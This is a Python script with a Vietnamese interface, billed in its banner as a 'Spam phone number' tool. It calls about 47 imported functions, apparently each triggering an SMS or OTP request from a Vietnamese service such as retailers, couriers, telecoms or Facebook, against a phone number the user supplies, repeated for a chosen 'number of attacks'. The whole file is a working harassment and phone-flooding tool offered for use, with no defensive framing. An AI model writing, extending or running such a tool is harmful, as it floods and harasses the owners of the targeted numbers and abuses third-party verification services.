import requests
import concurrent.futures
import time
import module as md
import os
from rich.console import Console
from time import sleep
import sys
from pystyle import Colors, Colorate
def Write_Print(text, color, interval):
    for char in text:
        console.print(char, style=color, end="")
        time.sleep(interval)
    print() 
console = Console()
functions = [
    md.beau, md.hoanvu, md.tokyo, md.cir, md.guma, md.dkimu, md.otpmu, md.vina,
    md.air, md.fa, md.sms3, md.chotot, md.sapo, md.medi, md.acfc, md.ahamove, md.longchou,
    md.gala, md.alf, md.fu, md.meta, md.money, md.fm, md.emart, md.hana, md.med,
    md.ghn, md.shop, md.tgdt, md.concung, md.hoang, md.winmart, md.kingz, md.phuc,
    md.robot, md.fb, md.mocha, md.dvcd, md.myvt, md.phar, md.fptshop, md.blu,
    md.tv360, md.domi, md.vtpost, md.shine, md.lote
]
def run(phone, i):
    for func in functions:
        try:
            func(phone)
            print(Colorate.Horizontal(Colors.green_to_white, f"Đã gửi yêu cầu {func.__name__} thành công ✓."))
        except Exception as e:
            print(Colorate.Horizontal(Colors.red_to_white, f"Lỗi khi gửi yêu cầu {func.__name__}: ❌ {e}"))
if __name__ == "__main__":
 while True:
        os.system('cls' if os.name == 'nt' else 'clear')
        Write_Print("""
    ╔══════════════════════════════════════════════════════╗
    ║    Spam phone number  | Dev by AnAn                  ║             
    ╚══════════════════════════════════════════════════════╝
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡤⠐⠢⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡠⠉⠀⠀⠀⠱⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣮⣑⠡⡀⡀⠀⢀⡇⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⣄⠈⣌⠪⡄⢰⢡⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢿⣾⣀⠈⢂⠃⡈⠘⣄⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢘⣿⣷⣄⠤⢢⠁⡠⠂⠢⡀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⠏⣸⡿⠟⣾⠓⠉⡖⠀⠀⠈⢂
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣆⡏⢸⠟⠀⣾⠀⠈⢡⡠⠂⠀⠈
⠱⣦⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡼⡀⡇⢈⠐⠠⡟⠀⠀⢞⡿⢅⠄⢀
⠀⠹⣿⣷⣦⡀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠜⠊⢛⡃⠘⠀⠀⡇⠀⡈⠶⠄⠒⠂⡔
⠀⠀⠘⣿⣿⣿⣷⣄⣀⠀⠤⡠⡤⠒⠫⠱⠀⣼⠧⠀⠀⠀⢁⠠⢱⠤⠒⠒⣠⠇
⠀⠀⠀⠘⢿⣿⣿⣿⣾⡷⡋⣞⠔⡣⠎⠙⠂⠘⠒⠲⡖⡒⠒⡶⢙⠀⠈⠉⣸⠀
⠀⠀⠀⠀⠀⠉⠻⣿⣿⡿⣿⣿⣯⠪⡖⠤⠤⠔⣀⣤⡃⠀⠀⡁⠀⣀⠄⠊⡜⠀
⠀⠀⠀⠀⠀⠀⠀⠈⠛⢿⡌⠙⢿⣾⡫⠅⠂⠉⠀⠀⠁⠪⢁⠈⠉⠀⠀⣸⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠚⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠀⠀⠀⠉⠀⠀
         \n""","blue", 0.0009)
        sleep(2)
        print(Colorate.Diagonal(Colors.blue_to_green, "1: Spam số điện thoại"))
        print(Colorate.Diagonal(Colors.blue_to_green, "2: Thoát"))
        choice = input()

        if choice == '1':
            if len(sys.argv) > 2:
                phone = sys.argv[1]
                count = int(sys.argv[2])
            else:
                phone = input(Colorate.Horizontal(Colors.blue_to_white, "Nhập số điện thoại: "))
                count = int(input(Colorate.Horizontal(Colors.blue_to_white, "Số lần muốn tấn công: ")))

            for i in range(1, count + 1):
                run(phone, i)

            print(Colorate.Horizontal(Colors.blue_to_white, "Đã hoàn thành"))
            input(Colorate.Horizontal(Colors.blue_to_white, "Nhấn Enter để tiếp tục"))

        elif choice == '2':
            print(Colorate.Diagonal(Colors.purple_to_blue, "Cảm ơn đã sử dụng tool"))
            sys.exit()

        else:
            print(Colorate.Diagonal(Colors.red_to_white, "Nhập sai, vui lòng thử lại"))
            input(Colorate.Diagonal(Colors.red_to_white, "Nhấn Enter để chọn lại"))